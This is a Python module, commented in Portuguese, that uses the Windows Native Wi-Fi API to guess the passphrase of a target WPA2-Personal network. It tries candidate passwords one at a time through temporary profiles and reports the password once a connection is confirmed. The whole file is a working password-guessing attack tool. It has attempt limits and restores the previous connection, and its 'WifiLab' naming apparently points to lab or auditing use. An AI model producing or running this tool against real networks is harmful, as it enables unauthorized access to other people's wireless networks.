"""Conexões temporárias WPA2-Personal via Native Wi-Fi, sem salvar perfis."""

from __future__ import annotations

import ctypes
import sys
import time
import uuid
from dataclasses import dataclass
from xml.etree import ElementTree as ET


@dataclass(frozen=True)
class Connection:
    profile: str
    ssid: bytes
    mode: int
    secure: bool
    auth: int
    cipher: int


def profile_xml(ssid: str, password: str, name: str) -> str:
    raw = ssid.encode("utf-8")
    if not 1 <= len(raw) <= 32:
        raise ValueError("o SSID UTF-8 deve ter de 1 a 32 bytes")
    if not 8 <= len(password) <= 63 or any(ord(c) < 32 or ord(c) > 126 for c in password):
        raise ValueError("senha inválida: use de 8 a 63 caracteres ASCII imprimíveis")
    namespace = "http://www.microsoft.com/networking/WLAN/profile/v1"
    root = ET.Element("WLANProfile", xmlns=namespace)
    ET.SubElement(root, "name").text = name
    config = ET.SubElement(root, "SSIDConfig")
    network = ET.SubElement(config, "SSID")
    ET.SubElement(network, "hex").text = raw.hex().upper()
    ET.SubElement(root, "connectionType").text = "ESS"
    ET.SubElement(root, "connectionMode").text = "manual"
    security = ET.SubElement(ET.SubElement(root, "MSM"), "security")
    auth = ET.SubElement(security, "authEncryption")
    for key, value in (("authentication", "WPA2PSK"), ("encryption", "AES"), ("useOneX", "false")):
        ET.SubElement(auth, key).text = value
    shared = ET.SubElement(security, "sharedKey")
    for key, value in (("keyType", "passPhrase"), ("protected", "false"), ("keyMaterial", password)):
        ET.SubElement(shared, key).text = value
    return ET.tostring(root, encoding="unicode")


def confirmed(connection: Connection | None, profile: str, ssid: bytes) -> bool:
    return bool(connection and connection.profile == profile and connection.ssid == ssid
                and connection.mode == 1 and connection.secure
                and connection.auth == 7 and connection.cipher == 4)


class WindowsWifi:
    """API carregada somente no Windows; conexão temporária não vira perfil salvo."""

    def __init__(self, interface: str | None = None):
        if sys.platform != "win32":
            raise OSError("o modo windows exige Windows; os testes offline continuam disponíveis")
        from ctypes import wintypes as w

        class GUID(ctypes.Structure):
            _fields_ = [("data1", w.DWORD), ("data2", w.WORD), ("data3", w.WORD),
                        ("data4", w.BYTE * 8)]

        class SSID(ctypes.Structure):
            _fields_ = [("length", w.DWORD), ("data", w.BYTE * 32)]

        class Interface(ctypes.Structure):
            _fields_ = [("guid", GUID), ("description", w.WCHAR * 256), ("state", ctypes.c_int)]

        class Association(ctypes.Structure):
            _fields_ = [("ssid", SSID), ("bss_type", ctypes.c_int), ("bssid", w.BYTE * 6),
                        ("phy", ctypes.c_int), ("phy_index", w.ULONG), ("signal", w.ULONG),
                        ("rx_rate", w.ULONG), ("tx_rate", w.ULONG)]

        class Security(ctypes.Structure):
            _fields_ = [("enabled", w.BOOL), ("one_x", w.BOOL),
                        ("auth", ctypes.c_int), ("cipher", ctypes.c_int)]

        class Attributes(ctypes.Structure):
            _fields_ = [("state", ctypes.c_int), ("mode", ctypes.c_int),
                        ("profile", w.WCHAR * 256), ("association", Association), ("security", Security)]

        class Parameters(ctypes.Structure):
            _fields_ = [("mode", ctypes.c_int), ("profile", w.LPCWSTR),
                        ("ssid", ctypes.POINTER(SSID)), ("bssid_list", ctypes.c_void_p),
                        ("bss_type", ctypes.c_int), ("flags", w.DWORD)]

        if ctypes.sizeof(GUID) != 16 or ctypes.sizeof(Attributes) != 604:
            raise OSError("estruturas Native Wi-Fi incompatíveis com esta versão de Python/Windows")
        self.w, self.GUID, self.Attributes, self.Parameters = w, GUID, Attributes, Parameters
        self.api = ctypes.WinDLL("wlanapi.dll")
        signatures = {
            "WlanOpenHandle": [w.DWORD, ctypes.c_void_p, ctypes.POINTER(w.DWORD), ctypes.POINTER(w.HANDLE)],
            "WlanCloseHandle": [w.HANDLE, ctypes.c_void_p],
            "WlanEnumInterfaces": [w.HANDLE, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)],
            "WlanQueryInterface": [w.HANDLE, ctypes.POINTER(GUID), ctypes.c_int, ctypes.c_void_p,
                                   ctypes.POINTER(w.DWORD), ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p],
            "WlanConnect": [w.HANDLE, ctypes.POINTER(GUID), ctypes.POINTER(Parameters), ctypes.c_void_p],
            "WlanDisconnect": [w.HANDLE, ctypes.POINTER(GUID), ctypes.c_void_p],
        }
        for name, arguments in signatures.items():
            function = getattr(self.api, name)
            function.argtypes, function.restype = arguments, w.DWORD
        self.api.WlanFreeMemory.argtypes = [ctypes.c_void_p]
        self.api.WlanFreeMemory.restype = None
        self.handle = w.HANDLE()
        negotiated = w.DWORD()
        self.check(self.api.WlanOpenHandle(2, None, ctypes.byref(negotiated), ctypes.byref(self.handle)))
        pointer = ctypes.c_void_p()
        try:
            self.check(self.api.WlanEnumInterfaces(self.handle, None, ctypes.byref(pointer)))
            count = ctypes.cast(pointer, ctypes.POINTER(w.DWORD))[0]
            items = (Interface * count).from_address(pointer.value + 2 * ctypes.sizeof(w.DWORD))
            choices = []
            for item in items:
                guid = GUID.from_buffer_copy(item.guid)
                identifier = str(uuid.UUID(bytes_le=bytes(guid)))
                if interface is None or interface.lower().strip("{}") in (item.description.lower(), identifier):
                    choices.append((guid, item.description, identifier))
            if len(choices) != 1:
                available = "; ".join(f"{item.description}: {uuid.UUID(bytes_le=bytes(item.guid))}" for item in items)
                raise ValueError(f"selecione uma interface com --interface (GUID ou descrição). Disponíveis: {available or 'nenhuma'}")
            self.guid, self.description, self.identifier = choices[0]
        except BaseException:
            self.close()
            raise
        finally:
            if pointer.value:
                self.api.WlanFreeMemory(pointer)

    @staticmethod
    def check(code):
        if code:
            raise OSError(f"Native Wi-Fi retornou erro {code}: {ctypes.FormatError(code).strip()}")

    def current(self) -> Connection | None:
        pointer, size = ctypes.c_void_p(), self.w.DWORD()
        try:
            code = self.api.WlanQueryInterface(self.handle, ctypes.byref(self.guid), 7, None,
                                              ctypes.byref(size), ctypes.byref(pointer), None)
            if code == 5023:  # ERROR_INVALID_STATE: interface sem conexão.
                return None
            self.check(code)
            if size.value < ctypes.sizeof(self.Attributes):
                raise OSError("resposta Native Wi-Fi com tamanho inesperado")
            data = ctypes.cast(pointer, ctypes.POINTER(self.Attributes)).contents
            if data.state != 1:
                return None
            if data.association.ssid.length > 32:
                raise OSError("SSID inválido na resposta do Windows")
            return Connection(data.profile, bytes(data.association.ssid.data[:data.association.ssid.length]),
                              data.mode, bool(data.security.enabled), data.security.auth, data.security.cipher)
        finally:
            if pointer.value:
                self.api.WlanFreeMemory(pointer)

    def connect(self, profile: str, temporary=True):
        parameters = self.Parameters(1 if temporary else 0, profile, None, None, 1, 0)
        self.check(self.api.WlanConnect(self.handle, ctypes.byref(self.guid), ctypes.byref(parameters), None))

    def disconnect(self):
        self.check(self.api.WlanDisconnect(self.handle, ctypes.byref(self.guid), None))

    def close(self):
        if self.handle:
            self.api.WlanCloseHandle(self.handle, None)
            self.handle = self.w.HANDLE()


def attempt(wifi, ssid: str, password: str, timeout: float) -> bool:
    name = "WifiLab-" + uuid.uuid4().hex
    wifi.connect(profile_xml(ssid, password, name))
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if confirmed(wifi.current(), name, ssid.encode("utf-8")):
            return True
        time.sleep(0.5)
    return False


def run_windows(args, candidates, wifi_factory=WindowsWifi) -> int:
    """Uma tentativa por vez; falha/timeout não é prova de senha incorreta."""
    if not 1 <= len(args.ssid.encode("utf-8")) <= 32:
        raise ValueError("o SSID UTF-8 deve ter de 1 a 32 bytes")
    if not 1 <= args.limit <= 1000 or not 5 <= args.timeout <= 60:
        raise ValueError("use --limit entre 1 e 1000 e --timeout entre 5 e 60 segundos")
    wifi = wifi_factory(args.interface)
    previous = None
    started = False
    try:
        previous = wifi.current()
        print(f"Adaptador: {wifi.description}. Rede alvo: {args.ssid!r}.")
        print("Teste de conexões temporárias WPA2-Personal/AES. A conexão Wi-Fi atual pode cair.", flush=True)
        tested = skipped = 0
        for raw in candidates:
            if not 8 <= len(raw) <= 63 or any(c < 32 or c > 126 for c in raw):
                skipped += 1
                if skipped >= 10000:
                    raise ValueError("10.000 candidatas inválidas; revise as regras ou a lista")
                continue
            if tested >= args.limit:
                print(f"Busca parcial: limite de {args.limit} tentativas atingido.")
                return 3
            started = True
            wifi.disconnect()
            tested += 1
            print(f"Tentativa {tested}/{args.limit}...", flush=True)
            if attempt(wifi, args.ssid, raw.decode("ascii"), args.timeout):
                print(f"Conexão WPA2-Personal confirmada com a senha: {raw.decode('ascii')!r}")
                return 0
            wifi.disconnect()
            print("Conexão não confirmada no prazo; senha, sinal, política ou indisponibilidade podem ser a causa.")
        print(f"Busca concluída: {tested} tentativas; {skipped} candidatas inválidas ignoradas. Nenhuma conexão confirmada.")
        return 1
    finally:
        if started:
            try:
                wifi.disconnect()
                if previous and previous.mode == 0 and previous.profile:
                    wifi.connect(previous.profile, temporary=False)
                    deadline = time.monotonic() + 15
                    while time.monotonic() < deadline:
                        current = wifi.current()
                        if current and current.profile == previous.profile and current.ssid == previous.ssid:
                            print("Conexão anterior restaurada.")
                            break
                        time.sleep(0.5)
                    else:
                        print("Não foi possível confirmar a restauração; reconecte pelo menu Wi-Fi do Windows.", file=sys.stderr)
            except (OSError, KeyboardInterrupt):
                print("Reconecte pelo menu Wi-Fi do Windows para restaurar a conexão anterior.", file=sys.stderr)
        wifi.close()
